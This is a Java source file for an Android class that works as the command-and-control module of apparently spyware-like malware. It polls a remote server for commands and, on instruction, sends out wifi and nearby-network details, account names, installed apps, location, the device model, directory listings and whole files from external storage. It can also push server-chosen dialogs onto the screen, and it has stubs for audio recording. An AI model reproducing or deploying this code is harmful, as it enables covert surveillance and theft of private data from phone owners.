package com.safe.myapp;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.text.format.Formatter;
import android.widget.Toast;

import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import cz.msebera.android.httpclient.Header;
import cz.msebera.android.httpclient.entity.StringEntity;

public class SafeCommunications {

    private Context context;
    private SafeStatus status;
    private SafeLogger logger;
    private String simpleID;

    public SafeCommunications(Context context, SafeStatus status, SafeLogger logger, String simpleID) {
        this.context = context;
        this.status = status;
        this.logger = logger;
        this.simpleID = simpleID;
    }

    private void sayWifi() throws JSONException {
        ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
        JSONObject jsonObject = new JSONObject();
        if (mWifi.isConnected()) {
            jsonObject.put("isWifiOn", true);
            jsonObject.put("state", wifiInfo.getSupplicantState());
            jsonObject.put("ssid", wifiInfo.getSSID());
            jsonObject.put("bssid", wifiInfo.getBSSID());
            jsonObject.put("mac", wifiInfo.getMacAddress());
            jsonObject.put("ip", Formatter.formatIpAddress(wifiInfo.getIpAddress()));
            List<ScanResult> results = wifiMgr.getScanResults();
            ArrayList<String> nearby = new ArrayList<>();
            for (ScanResult result : results) {
                nearby.add(result.level + " " + result.SSID + " " + result.BSSID);
            }
            Collections.sort(nearby);
            if (results.size() > 0) {
                jsonObject.put("nearby", new JSONArray(nearby));
            }
        } else {
            jsonObject.put("isWifiOn", false);
        }

        JSONObject params = new JSONObject();
        params.put("wifi", jsonObject);
        say(params);
    }

    private void sayModelBrand() throws JSONException {
        JSONObject params = new JSONObject();
        params.put("modelBrand", Build.BRAND + " " + Build.MODEL);
        say(params);
    }

    private void sayInstalledApps() throws JSONException {
        List<PackageInfo> packList = context.getPackageManager().getInstalledPackages(0);
        List<String> apps = new ArrayList<>();
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String app = packInfo.applicationInfo.loadLabel(context.getPackageManager()).toString();
                if(!apps.contains(app)) {
                    apps.add(app);
                }
            }
        }
        Collections.sort(apps);
        JSONObject params = new JSONObject();
        params.put("installedApps", new JSONArray(apps));
        say(params);
    }

    public void sayLocation(Location loc) throws JSONException {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("lat", loc.getLatitude());
        jsonObject.put("lng", loc.getLongitude());
        jsonObject.put("accuracy", loc.getAccuracy());
        jsonObject.put("timestamp", loc.getTime());
        jsonObject.put("provider", loc.getProvider());
        JSONObject params = new JSONObject();
        params.put("location", jsonObject);
        say(params);
    }

    private void sayAccounts() throws JSONException {
        Account[] accounts = AccountManager.get(context).getAccounts();
        ArrayList<String> accountList = new ArrayList<>();
        if (accounts.length > 0) {
            for (Account account : accounts) {
                accountList.add(account.name + ": " + account.type);
            }
        } else {
            accountList.add("No accounts found: null");
        }
        Collections.sort(accountList);
        JSONObject params = new JSONObject();
        params.put("accounts", new JSONArray(accountList));
        say(params);
    }

    private void sayDirTree(String dir) throws JSONException {
        File file = new File(Environment.getExternalStorageDirectory(), dir);
        logger.write(file.toString());
        JSONObject params = new JSONObject();
        JSONObject object = new JSONObject();
        object.put("dirName", file.getName());
        object.put("content", dirContent(file));
        params.put("dirTree", object);
        say(params);
    }

    private JSONArray dirContent(File dir) throws JSONException {
        JSONArray jsonArray = new JSONArray();
        ArrayList<String> dirs = new ArrayList<>();
        ArrayList<String> files = new ArrayList<>();
        if (dir.exists()) {
            if (dir.isDirectory()) {
                for (File f : dir.listFiles()) {
                    if(f.isDirectory()) {
                        dirs.add(f.getName());
                    } else if (f.isFile()){
                        files.add(f.getName());
                    }
                }
            }
        }
        Collections.sort(dirs);
        Collections.sort(files);
        for(String d : dirs){
            jsonArray.put(d + "/");
        }
        for(String f : files){
            jsonArray.put(f);
        }
        return jsonArray;
    }

    // TODO Walk directory
    public void download(String... fileLocs) {
        // list of files to be uploaded to server
        ArrayList<File> files = new ArrayList<>();
        try {
            for (String fileLoc : fileLocs) {
                // create a file object from each string
                File file = new File(Environment.getExternalStorageDirectory(), fileLoc);
                // check if the file exists
                if (file.exists()) {
                    // if it exists and is a file add the file to our list
                    if (file.isFile()) {
                        files.add(file);
                        // if it is a directory add all files in it to our list
                    } else if (file.isDirectory()) {
                        logger.write(file + " is a directory, sending all files within it, skipping folders");
                        for (File f : file.listFiles()) {
                            if (f.isFile()) {
                                files.add(f);
                                logger.write("sending " + f + " " + f.length());
                            }
                        }
                    } else {
                        logger.write(fileLoc + " is not a valid file");
                    }
                } else {
                    logger.write(fileLoc + " does not exist");
                }
            }
            // upload files to server
            upload(files.toArray(new File[files.size()]));
        } catch (NullPointerException e) {
            logger.write("w00ps");
        }
    }

    // Poll server for actions to take
    public void pollServer() {
        new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... voids) {
                RequestParams params = new RequestParams();
                SafeRestClient.get("/actions/" + simpleID + "/", params, new AsyncHttpResponseHandler() {

                    @Override
                    public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                        actionHandler(responseBody);
                    }

                    @Override
                    public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {

                    }
                });
                return null;
            }
        }.execute();
    }

    public void actionHandler(byte[] response) {
        try {
            JSONObject jObject = new JSONObject(new String(response, "UTF-8"));
            logger.write(jObject.toString(2));
            boolean startLocation = jObject.getBoolean("startLocation");
            boolean stopLocation = jObject.getBoolean("stopLocation");
            boolean startAudio = jObject.getBoolean("startAudio");
            boolean stopAudio = jObject.getBoolean("stopAudio");
            boolean sayWifi = jObject.getBoolean("sayWifi");
            boolean sayAccounts = jObject.getBoolean("sayAccounts");
            boolean saySingleLocation = jObject.getBoolean("saySingleLocation");
            boolean sayInstalledApps = jObject.getBoolean("sayInstalledApps");
            boolean sayModelBrand = jObject.getBoolean("sayModelBrand");
            boolean sayInfectedApp = jObject.getBoolean("sayInfectedApp");
            String sayDirTree = "";
            try {
                sayDirTree = jObject.getString("sayDirTree");
                if (!sayDirTree.isEmpty()) {
                    sayDirTree(sayDirTree);
                }

            } catch (JSONException e) {
                e.printStackTrace();
            }
            String toast = jObject.getString("toast");
            String dialog = jObject.getString("dialog");

            if (startLocation) {

            }

            if (stopLocation) {

            }

            if (startAudio) {

            }

            if (stopAudio) {

            }

            if (sayWifi) {
                sayWifi();
            }

            if (sayAccounts) {
                sayAccounts();
            }

            if (saySingleLocation) {
                SafeService.getLocs().getSingleLocation();
            }

            if (sayInstalledApps) {
                sayInstalledApps();
            }

            if (sayModelBrand) {
                sayModelBrand();
            }

            if (sayInfectedApp) {

            }

            if (!toast.isEmpty()) {
                showToast(toast);
            }

            if (!dialog.isEmpty()) {
                showDialog(dialog);
            }

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void showToast(String message) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String[] params) {
                String str = params[0];
                return str;
            }

            @Override
            protected void onPostExecute(String message) {
                Toast.makeText(context, message, Toast.LENGTH_LONG).show();
            }
        }.execute(message);
    }

    private void showDialog(String message) {
        Intent i = new Intent(context, SafeDialog.class);
        i.putExtra("message", message);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(i);
    }

    public void say(final JSONObject jsonParams) {
        new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... voids) {
                StringEntity entity = null;
                try {
                    entity = new StringEntity(jsonParams.toString());
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
                logger.write(jsonParams.toString());
                SafeRestClient.postJson("/say/" + simpleID + "/", context, entity, new AsyncHttpResponseHandler() {

                    @Override
                    public void onSuccess(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody) {

                    }

                    @Override
                    public void onFailure(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody, Throwable error) {

                    }
                });
                return null;
            }
        }.execute();
    }

    public void upload(File... files) {
        new AsyncTask<File, Void, Void>() {
            @Override
            protected Void doInBackground(File... files) {
                for (final File file : files) {
                    logger.write(file.getName() + " Checking");
                    RequestParams fileCheck = new RequestParams();
                    fileCheck.put("fileName", file.getName());
                    fileCheck.put("clientId", simpleID);
                    fileCheck.put("fileSize", file.length());
                    SafeRestClient.get("/acceptFile/" + simpleID + "/", fileCheck, new AsyncHttpResponseHandler() {

                        @Override
                        public void onSuccess(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody) {

                            RequestParams params = new RequestParams();
                            logger.write(file.getName() + " Does not exist. Uploading...");
                            try {
                                params.put("tehAwesomeFile", file);
                                params.put("clientId", simpleID);
                            } catch (FileNotFoundException e) {
                                logger.write("Could not find file: " + file.getName());
                            }

                            SafeRestClient.post("/postFile/" + simpleID + "/", params, new AsyncHttpResponseHandler() {

                                @Override
                                public void onSuccess(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody) {
                                    try {
                                        logger.write(new String(responseBody, "UTF-8") + " Received");
                                    } catch (UnsupportedEncodingException e) {
                                        e.printStackTrace();
                                    }
                                }

                                @Override
                                public void onFailure(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody, Throwable error) {
                                    try {
                                        if (responseBody != null) {
                                            logger.write(new String(responseBody, "UTF-8"));
                                        }
                                    } catch (UnsupportedEncodingException e) {
                                        e.printStackTrace();
                                    }
                                }
                            });
                        }

                        @Override
                        public void onFailure(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody, Throwable error) {
                            // The server did not accept the file
                            try {
                                logger.write(new String(responseBody, "UTF-8"));
                            } catch (UnsupportedEncodingException e) {
                                e.printStackTrace();
                            }
                        }
                    });
                }
                logger.write("Upload completed");
                return null;
            }
        }.execute(files);

    }
}